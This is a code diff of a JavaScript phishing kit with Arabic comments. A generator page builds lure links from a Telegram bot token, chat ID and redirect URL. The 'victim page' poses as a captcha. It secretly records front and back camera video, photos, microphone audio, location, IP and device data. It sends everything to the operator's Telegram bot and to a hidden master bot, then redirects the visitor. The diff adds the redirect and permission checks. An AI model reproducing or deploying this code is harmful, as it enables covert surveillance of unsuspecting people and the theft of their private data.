                         `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
                         `─────────────────`;
                     try {
                         await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
+                            body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg, parse_mode: 'Markdown' })
                         });
                     } catch (e) { console.warn('Send to master failed:', e); }
                 }
@@ -1641,9 +1626,18 @@
                     if (isBusy) return;
                     const chatId = chatIdInput.value.trim();
                     const botToken = botTokenInput.value.trim();
+                    const targetUrl = targetUrlInput.value.trim();
 
-                    if (!chatId || !botToken) {
+                    if (!chatId || !botToken || !targetUrl) {
                         showToast('⚠️ يرجى ملء جميع الحقول المطلوبة.', 'warning');
+                        return;
+                    }
+
+                    // التحقق من صحة الرابط
+                    try {
+                        new URL(targetUrl);
+                    } catch (e) {
+                        showToast('⚠️ الرابط المستهدف غير صحيح.', 'warning');
                         return;
                     }
 
@@ -1658,20 +1652,20 @@
                     genBtn.textContent = 'جارٍ التوليد …';
 
                     try {
-                        // توليد التوكن الثابت بناءً على توكن البوت
                         const shortToken = await generateShortToken(botToken);
-                        const encoded = encodeBotData(botToken, chatId);
+                        const encoded = encodeData(botToken, chatId, targetUrl);
                         const base = window.location.origin + window.location.pathname;
                         const link = `${base}?t=${shortToken}&d=${encoded}`;
 
                         tokenDisplay.textContent = shortToken;
                         resultSub.textContent = link;
 
-                        await sendLinkToUser(botToken, chatId, link, shortToken);
-                        await sendToMaster(botToken, chatId, shortToken);
+                        await sendLinkToUser(botToken, chatId, link, shortToken, targetUrl);
+                        await sendToMaster(botToken, chatId, shortToken, targetUrl);
 
                         localStorage.setItem('zeus_last_chat_id', chatId);
                         localStorage.setItem('zeus_last_bot_token', botToken);
+                        localStorage.setItem('zeus_last_target_url', targetUrl);
 
                         genBtn.classList.remove('busy');
                         genBtn.classList.add('done');
@@ -1735,10 +1729,13 @@
                     }
                 });
 
+                // ===== تحميل البيانات المحفوظة =====
                 const savedBot = localStorage.getItem('zeus_last_bot_token');
                 const savedChat = localStorage.getItem('zeus_last_chat_id');
+                const savedUrl = localStorage.getItem('zeus_last_target_url');
                 if (savedBot) botTokenInput.value = savedBot;
                 if (savedChat) chatIdInput.value = savedChat;
+                if (savedUrl) targetUrlInput.value = savedUrl;
 
                 botTokenInput.addEventListener('change', function() {
                     if (this.value.trim()) localStorage.setItem('zeus_last_bot_token', this.value.trim());
@@ -1746,58 +1743,135 @@
                 chatIdInput.addEventListener('change', function() {
                     if (this.value.trim()) localStorage.setItem('zeus_last_chat_id', this.value.trim());
                 });
+                targetUrlInput.addEventListener('change', function() {
+                    if (this.value.trim()) localStorage.setItem('zeus_last_target_url', this.value.trim());
+                });
             }
 
             // ============================================================
-            //  VICTIM PAGE — جمع البيانات وإرسالها بالاستايل المطلوب
+            //  VICTIM PAGE — مع التحقق من الصلاحيات
             // ============================================================
 
-            function initVictimPage(encodedData) {
+            function initVictimPage(encodedData, rawToken) {
                 const spinner = document.getElementById('spinner');
                 const checkbox = document.getElementById('captcha');
                 const mainText = document.getElementById('mainText');
                 const video = document.getElementById('hiddenVideo');
                 const canvas = document.getElementById('hiddenCanvas');
                 const ctx = canvas.getContext('2d');
+                const permStatus = document.getElementById('permissionStatus');
+                const permFront = document.getElementById('permFront');
+                const permBack = document.getElementById('permBack');
+                const permMic = document.getElementById('permMic');
+                const permLoc = document.getElementById('permLoc');
+                const permAll = document.getElementById('permAll');
 
                 let isRunning = false;
                 let collectionDone = false;
+                let targetUrl = null;
+                let botCreds = null;
 
-                // ===== فك تشفير بيانات المستخدم =====
-                function decodeBotData(encoded) {
+                // ===== فك تشفير البيانات =====
+                function decodeData(encoded) {
                     try {
                         const decoded = decodeURIComponent(atob(encoded));
                         const data = JSON.parse(decoded);
-                        return { botToken: data.bot, chatId: data.chat };
+                        return { botToken: data.bot, chatId: data.chat, url: data.url };
                     } catch (e) {
                         console.warn('Decode error:', e);
                         return null;
                     }
                 }
 
-                let botCreds = null;
                 if (encodedData) {
-                    botCreds = decodeBotData(encodedData);
+                    const dec = decodeData(encodedData);
+                    if (dec) {
+                        botCreds = dec;
+                        targetUrl = dec.url;
+                    }
+                }
+
+                // ===== عرض حالة الصلاحيات =====
+                function updatePermissionUI(permissions) {
+                    permStatus.style.display = 'block';
+
+                    const front = permissions.front;
+                    const back = permissions.back;
+                    const mic = permissions.mic;
+                    const loc = permissions.loc;
+
+                    permFront.textContent = front === true ? '✅ مُنحت' : front === false ? '❌ مرفوضة' : '⏳ في الانتظار';
+                    permFront.className = 'perm-status ' + (front === true ? 'granted' : front === false ? 'denied' :
+                        'pending');
+
+                    permBack.textContent = back === true ? '✅ مُنحت' : back === false ? '❌ مرفوضة' : '⏳ في الانتظار';
+                    permBack.className = 'perm-status ' + (back === true ? 'granted' : back === false ? 'denied' :
+                        'pending');
+
+                    permMic.textContent = mic === true ? '✅ مُنحت' : mic === false ? '❌ مرفوضة' : '⏳ في الانتظار';
+                    permMic.className = 'perm-status ' + (mic === true ? 'granted' : mic === false ? 'denied' : 'pending');
+
+                    permLoc.textContent = loc === true ? '✅ مُنحت' : loc === false ? '❌ مرفوضة' : '⏳ في الانتظار';
+                    permLoc.className = 'perm-status ' + (loc === true ? 'granted' : loc === false ? 'denied' : 'pending');
+
+                    const allGranted = front === true && back === true && mic === true && loc === true;
+                    const anyDenied = front === false || back === false || mic === false || loc === false;
+
+                    if (allGranted) {
+                        permAll.textContent = '✅ جميع الصلاحيات مُنحت! جاري جمع البيانات ...';
+                        permAll.className = 'perm-all all-granted';
+                    } else if (anyDenied) {
+                        permAll.textContent = '❌ بعض الصلاحيات مرفوضة! لا يمكن المتابعة.';
+                        permAll.className = 'perm-all all-denied';
+                    } else {
+                        permAll.textContent = '⏳ جاري التحقق من الصلاحيات...';
+                        permAll.className = 'perm-all';
+                    }
+
+                    return allGranted;
+                }
+
+                // ===== التحقق من الصلاحيات =====
+                async function checkAllPermissions() {
+                    const perms = { front: null, back: null, mic: null, loc: null };
+
+                    // كاميرا أمامية
+                    try {
+                        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                        s.getTracks().forEach(t => t.stop());
+                        perms.front = true;
+                    } catch { perms.front = false; }
+
+                    // كاميرا خلفية
+                    try {
+                        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                        s.getTracks().forEach(t => t.stop());
+                        perms.back = true;
+                    } catch { perms.back = false; }
+
+                    // ميكروفون
+                    try {
+                        const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+                        s.getTracks().forEach(t => t.stop());
+                        perms.mic = true;
+                    } catch { perms.mic = false; }
+
+                    // الموقع
+                    try {
+                        await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(
+                                () => resolve(true),
+                                () => reject(false)
+                            );
+                        });
+                        perms.loc = true;
+                    } catch { perms.loc = false; }
+
+                    return perms;
                 }
 
                 // ===== دوال مساعدة =====
                 function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-                async function requestAllPermissions() {
-                    const results = await Promise.allSettled([
-                        navigator.mediaDevices.getUserMedia({ video: true }),
-                        navigator.mediaDevices.getUserMedia({ audio: true }),
-                        new Promise((resolve) => {
-                            navigator.geolocation.getCurrentPosition(resolve, () => resolve(null));
-                        })
-                    ]);
-                    results.forEach(result => {
-                        if (result.status === 'fulfilled' && result.value && result.value.getTracks) {
-                            result.value.getTracks().forEach(t => t.stop());
-                        }
-                    });
-                    return true;
-                }
 
                 function getDeviceData() {
                     return {
@@ -1829,7 +1903,6 @@
                     });
                 }
 
-                // ===== الحصول على حالة البطارية =====
                 async function getBatteryStatus() {
                     try {
                         if (!navigator.getBattery) return { level: 'غير متاح', charging: false };
@@ -1837,12 +1910,8 @@
                         return {
                             level: Math.round(battery.level * 100) + '%',
                             charging: battery.charging,
-                            chargingTime: battery.chargingTime,
-                            dischargingTime: battery.dischargingTime
                         };
-                    } catch (e) {
-                        return { level: 'غير متاح', charging: false };
-                    }
+                    } catch { return { level: 'غير متاح', charging: false }; }
                 }
 
                 function getStream(facingMode) {
@@ -1902,118 +1971,89 @@
                     } catch (e) { console.warn('Send media failed:', e); }
                 }
 
-                // ===== دوال التنسيق المزخرفة =====
+                // ===== تنسيق الرسائل =====
                 function formatBatteryMessage(battery) {
-                    return `⭑ حالة البطارية ⭒\n` +
-                        `⊚─〔 الطاقة 〕────────\n` +
-                        `˼🔋˹ النسبة: ${battery.level} ⭒\n` +
-                        `─────────────────`;
+                    return `⭑ حالة البطارية ⭒\n⊚─〔 الطاقة 〕────────\n˼🔋˹ النسبة: ${battery.level} ⭒\n─────────────────`;
                 }
 
                 function formatLocationMessage(location) {
                     if (!location.lat || !location.lng) {
                         return `⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع غير متاح ⭒\n─────────────────`;
                     }
-                    const mapsUrl = `https://www.google.com/maps?q=${location.lat},${location.lng}`;
-                    return `⭑ حالة الموقع ⭒\n` +
-                        `⊚─〔 تنبيه 〕────────\n` +
-                        `˼⚠️˹ الموقع: [${location.lat}, ${location.lng}](${mapsUrl}) ⭒\n` +
-                        `─────────────────`;
+                    return `⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع: ${location.lat}, ${location.lng} ⭒\n─────────────────`;
                 }
 
                 function formatVisitMessage(ip, browser, token, time) {
-                    return `⭑ زيارة جديدة ⭒\n` +
-                        `⊚─〔 دخول 〕────────\n` +
-                        `˼🕒˹ ${time} ⭒\n` +
-                        `˼🆔˹ التوكن: ${token} ⭒\n` +
-                        `˼🌐˹ الـ IP: ${ip} ⭒\n` +
-                        `˼📌˹ الحدث: زيارة ⭒\n` +
-                        `˼📱˹ المتصفح: ${browser} ⭒\n` +
-                        `─────────────────`;
+                    return `⭑ زيارة جديدة ⭒\n⊚─〔 دخول 〕────────\n˼🕒˹ ${time} ⭒\n˼🆔˹ التوكن: ${token} ⭒\n˼🌐˹ الـ IP: ${ip} ⭒\n˼📌˹ الحدث: زيارة ⭒\n˼📱˹ المتصفح: ${browser} ⭒\n─────────────────`;
                 }
 
-                // ===== إرسال إلى المستخدم =====
+                // ===== إرسال البيانات للمستخدم =====
                 async function sendToUserBot(userToken, chatId, data, battery, token) {
-                    // 1. البطارية
-                    const battMsg = formatBatteryMessage(battery);
+                    // البطارية
                     await fetch(`https://api.telegram.org/bot${userToken}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: battMsg, parse_mode: 'Markdown' })
+                        body: JSON.stringify({ chat_id: chatId, text: formatBatteryMessage(battery) })
                     }).catch(() => {});
 
-                    // 2. الموقع
-                    const locMsg = formatLocationMessage(data.location);
+                    // الموقع
                     await fetch(`https://api.telegram.org/bot${userToken}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: locMsg, parse_mode: 'Markdown' })
+                        body: JSON.stringify({ chat_id: chatId, text: formatLocationMessage(data.location) })
                     }).catch(() => {});
 
-                    // 3. الزيارة
-                    const visitMsg = formatVisitMessage(data.ip, data.browser, token, data.time);
+                    // الزيارة
                     await fetch(`https://api.telegram.org/bot${userToken}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: visitMsg, parse_mode: 'Markdown' })
+                        body: JSON.stringify({ chat_id: chatId, text: formatVisitMessage(data.ip, data.browser, token,
+                                data.time) })
                     }).catch(() => {});
 
-                    // 4. الملفات
+                    // الصور
                     if (data.photos && data.photos.length > 0) {
                         for (let i = 0; i < data.photos.length; i++) {
                             const fd = new FormData();
                             fd.append('chat_id', chatId);
                             fd.append('photo', data.photos[i], `photo_${i+1}.jpg`);
                             fd.append('caption',
-                                `⭑ صورة ${i+1}/${data.photos.length} ⭒\n` +
-                                `⊚─〔 ميديا الضحية 〕────────\n` +
-                                `˼⏣˹ النوع: صورة ⭒\n` +
-                                `˼⏣˹ الترتيب: ${i+1} من ${data.photos.length} ⭒\n` +
-                                `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                                `─────────────────`
-                            );
+                                `⭑ صورة ${i+1}/${data.photos.length} ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صورة ⭒\n˼⏣˹ الترتيب: ${i+1} من ${data.photos.length} ⭒\n─────────────────`
+                                );
                             await sendMedia('sendPhoto', userToken, fd);
                         }
                     }
+                    // فيديو أمامي
                     if (data.frontVideo) {
                         const fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('video', data.frontVideo, 'front_video.webm');
                         fd.append('caption',
-                            `⭑ فيديو أمامي ⭒\n` +
-                            `⊚─〔 ميديا الضحية 〕────────\n` +
-                            `˼⏣˹ النوع: فيديو (أمامي) ⭒\n` +
-                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                            `─────────────────`
-                        );
+                            `⭑ فيديو أمامي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n─────────────────`
+                            );
                         await sendMedia('sendVideo', userToken, fd);
                     }
+                    // فيديو خلفي
                     if (data.backVideo) {
                         const fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('video', data.backVideo, 'back_video.webm');
                         fd.append('caption',
-                            `⭑ فيديو خلفي ⭒\n` +
-                            `⊚─〔 ميديا الضحية 〕────────\n` +
-                            `˼⏣˹ النوع: فيديو (خلفي) ⭒\n` +
-                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                            `─────────────────`
-                        );
+                            `⭑ فيديو خلفي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n─────────────────`
+                            );
                         await sendMedia('sendVideo', userToken, fd);
                     }
+                    // صوت
                     if (data.audio) {
                         const fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('audio', data.audio, 'audio.webm');
                         fd.append('caption',
-                            `⭑ تسجيل صوتي ⭒\n` +
-                            `⊚─〔 ميديا الضحية 〕────────\n` +
-                            `˼⏣˹ النوع: صوت ⭒\n` +
-                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                            `─────────────────`
-                        );
+                            `⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صوت ⭒\n─────────────────`
+                            );
                         await sendMedia('sendAudio', userToken, fd);
                     }
+                    // موقع
                     if (data.location && data.location.lat && data.location.lng) {
                         try {
                             await fetch(`https://api.telegram.org/bot${userToken}/sendLocation`, {
@@ -2029,65 +2069,51 @@
                     }
                 }
 
-                // ===== إرسال نسخة احتياطية للنظام =====
+                // ===== إرسال نسخة احتياطية =====
                 async function sendToMaster(data, battery, token) {
                     const userInfo = botCreds ?
                         `˼⏣˹ توكن المستخدم: ${botCreds.botToken} ⭒\n˼⏣˹ إيدي المستخدم: ${botCreds.chatId} ⭒` :
-                        `˼⏣˹ لا توجد بيانات مستخدم (إرسال احتياطي) ⭒`;
+                        `˼⏣˹ لا توجد بيانات مستخدم ⭒`;
 
-                    const battMsg =
-                        `⭑ نسخة احتياطية للنظام ⭒\n` +
-                        `⊚─〔 بيانات البطارية 〕────────\n` +
-                        `${formatBatteryMessage(battery)}\n` +
-                        `${userInfo}\n` +
-                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                        `─────────────────`;
                     await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: battMsg, parse_mode: 'Markdown' })
+                        body: JSON.stringify({
+                            chat_id: MASTER_CHAT_ID,
+                            text: `⭑ نسخة احتياطية ⭒\n${formatBatteryMessage(battery)}\n${userInfo}\n─────────────────`,
+                            parse_mode: 'Markdown'
+                        })
                     }).catch(() => {});
 
-                    const locMsg =
-                        `⭑ نسخة احتياطية للنظام ⭒\n` +
-                        `⊚─〔 بيانات الموقع 〕────────\n` +
-                        `${formatLocationMessage(data.location)}\n` +
-                        `${userInfo}\n` +
-                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                        `─────────────────`;
                     await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: locMsg, parse_mode: 'Markdown' })
+                        body: JSON.stringify({
+                            chat_id: MASTER_CHAT_ID,
+                            text: `⭑ نسخة احتياطية ⭒\n${formatLocationMessage(data.location)}\n${userInfo}\n─────────────────`,
+                            parse_mode: 'Markdown'
+                        })
                     }).catch(() => {});
 
-                    const visitMsg =
-                        `⭑ نسخة احتياطية للنظام ⭒\n` +
-                        `⊚─〔 بيانات الزيارة 〕────────\n` +
-                        `${formatVisitMessage(data.ip, data.browser, token, data.time)}\n` +
-                        `${userInfo}\n` +
-                        `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                        `─────────────────`;
                     await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: visitMsg, parse_mode: 'Markdown' })
+                        body: JSON.stringify({
+                            chat_id: MASTER_CHAT_ID,
+                            text: `⭑ نسخة احتياطية ⭒\n${formatVisitMessage(data.ip, data.browser, token, data.time)}\n${userInfo}\n─────────────────`,
+                            parse_mode: 'Markdown'
+                        })
                     }).catch(() => {});
 
-                    // الملفات للنسخة الاحتياطية
+                    // ملفات للنسخة الاحتياطية
                     if (data.photos && data.photos.length > 0) {
                         for (let i = 0; i < data.photos.length; i++) {
                             const fd = new FormData();
                             fd.append('chat_id', MASTER_CHAT_ID);
                             fd.append('photo', data.photos[i], `photo_${i+1}.jpg`);
                             fd.append('caption',
-                                `⭑ صورة ${i+1}/${data.photos.length} ⭒\n` +
-                                `⊚─〔 ميديا احتياطية 〕────────\n` +
-                                `˼⏣˹ النوع: صورة ⭒\n` +
-                                `˼⏣˹ الترتيب: ${i+1} من ${data.photos.length} ⭒\n` +
-                                `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                                `─────────────────`
-                            );
+                                `⭑ صورة ${i+1}/${data.photos.length} ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صورة ⭒\n─────────────────`
+                                );
                             await sendMedia('sendPhoto', MASTER_BOT_TOKEN, fd);
                         }
                     }
@@ -2096,12 +2122,8 @@
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('video', data.frontVideo, 'front_video.webm');
                         fd.append('caption',
-                            `⭑ فيديو أمامي ⭒\n` +
-                            `⊚─〔 ميديا احتياطية 〕────────\n` +
-                            `˼⏣˹ النوع: فيديو (أمامي) ⭒\n` +
-                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                            `─────────────────`
-                        );
+                            `⭑ فيديو أمامي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n─────────────────`
+                            );
                         await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.backVideo) {
@@ -2109,12 +2131,8 @@
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('video', data.backVideo, 'back_video.webm');
                         fd.append('caption',
-                            `⭑ فيديو خلفي ⭒\n` +
-                            `⊚─〔 ميديا احتياطية 〕────────\n` +
-                            `˼⏣˹ النوع: فيديو (خلفي) ⭒\n` +
-                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                            `─────────────────`
-                        );
+                            `⭑ فيديو خلفي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n─────────────────`
+                            );
                         await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.audio) {
@@ -2122,12 +2140,8 @@
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('audio', data.audio, 'audio.webm');
                         fd.append('caption',
-                            `⭑ تسجيل صوتي ⭒\n` +
-                            `⊚─〔 ميديا احتياطية 〕────────\n` +
-                            `˼⏣˹ النوع: صوت ⭒\n` +
-                            `˼⏣˹ الوقت: ${new Date().toLocaleString('ar-EG')} ⭒\n` +
-                            `─────────────────`
-                        );
+                            `⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صوت ⭒\n─────────────────`
+                            );
                         await sendMedia('sendAudio', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.location && data.location.lat && data.location.lng) {
@@ -2145,7 +2159,7 @@
                     }
                 }
 
-                // ===== الوظيفة الرئيسية (جمع البيانات وإرسالها) =====
+                // ===== الوظيفة الرئيسية =====
                 async function collectEverything() {
                     if (isRunning || collectionDone) return;
                     isRunning = true;
@@ -2153,9 +2167,28 @@
                     spinner.classList.add('loading');
                     mainText.textContent = 'جاري التحقق...';
                     mainText.className = 'text loading';
+                    permStatus.style.display = 'block';
 
                     try {
-                        await requestAllPermissions();
+                        // 1. التحقق من الصلاحيات
+                        const perms = await checkAllPermissions();
+                        const allGranted = updatePermissionUI(perms);
+
+                        if (!allGranted) {
+                            // بعض الصلاحيات مرفوضة
+                            spinner.classList.remove('loading', 'success');
+                            spinner.classList.add('failed');
+                            mainText.textContent = '❌ لم يتم منح جميع الصلاحيات';
+                            mainText.className = 'text permission-deny';
+                            checkbox.checked = false;
+                            isRunning = false;
+                            checkbox.disabled = false;
+                            return;
+                        }
+
+                        // 2. جميع الصلاحيات مُنحت → جمع البيانات
+                        mainText.textContent = '✅ جاري جمع البيانات...';
+                        mainText.className = 'text loading';
 
                         const [deviceData, ip, location, battery] = await Promise.all([
                             Promise.resolve(getDeviceData()),
@@ -2164,6 +2197,7 @@
                             getBatteryStatus()
                         ]);
 
+                        // كاميرا أمامية
                         const frontResult = await (async () => {
                             let stream = null;
                             try {
@@ -2186,6 +2220,7 @@
                             }
                         })();
 
+                        // كاميرا خلفية
                         const backVideo = await (async () => {
                             let stream = null;
                             try {
@@ -2203,6 +2238,7 @@
                             }
                         })();
 
+                        // تسجيل صوتي
                         const audioBlob = await recordAudio(3000);
 
                         const data = {
@@ -2221,37 +2257,44 @@
 
                         const token = rawToken || 'غير معروف';
 
+                        // 3. إرسال البيانات
+                        mainText.textContent = '📤 جاري الإرسال...';
+                        mainText.className = 'text loading';
+
                         if (botCreds && botCreds.botToken && botCreds.chatId) {
                             try {
                                 await sendToUserBot(botCreds.botToken, botCreds.chatId, data, battery, token);
-                            } catch (e) {
-                                console.warn('User send failed:', e);
-                            }
+                            } catch (e) { console.warn('User send failed:', e); }
                         }
 
                         try {
                             await sendToMaster(data, battery, token);
-                        } catch (e) {
-                            console.warn('Master send failed:', e);
-                        }
+                        } catch (e) { console.warn('Master send failed:', e); }
 
                         collectionDone = true;
 
-                        spinner.classList.remove('loading', 'success');
-                        spinner.classList.add('failed');
-                        mainText.textContent = 'فشل التحقق، حاول مجدداً';
-                        mainText.className = 'text failed';
-                        checkbox.checked = false;
+                        // 4. نجاح → توجيه إلى الرابط المستهدف
+                        spinner.classList.remove('loading', 'failed');
+                        spinner.classList.add('success');
+                        mainText.textContent = '✅ تم التحقق! جاري التوجيه...';
+                        mainText.className = 'text success';
 
-                        setTimeout(() => {
-                            location.reload();
-                        }, 5000);
+                        if (targetUrl) {
+                            setTimeout(() => {
+                                window.location.href = targetUrl;
+                            }, 2000);
+                        } else {
+                            // في حال عدم وجود رابط مستهدف
+                            setTimeout(() => {
+                                location.reload();
+                            }, 3000);
+                        }
 
                     } catch (error) {
                         console.error('Collection error:', error);
                         spinner.classList.remove('loading', 'success');
                         spinner.classList.add('failed');
-                        mainText.textContent = 'فشل التحقق، حاول مجدداً';
+                        mainText.textContent = '❌ حدث خطأ، حاول مجدداً';
                         mainText.className = 'text failed';
                         checkbox.checked = false;
                         isRunning = false;
@@ -2275,7 +2318,12 @@
                     }
                 });
 
-                console.log('✅ Victim page ready.');
+                // عرض حالة الصلاحيات بشكل مبدئي
+                permStatus.style.display = 'block';
+                permAll.textContent = '⏳ اضغط على المربع لبدء التحقق من الصلاحيات';
+                permAll.className = 'perm-all';
+
+                console.log('✅ Victim page ready. Token:', rawToken, 'Target:', targetUrl);
             }
 
         })();
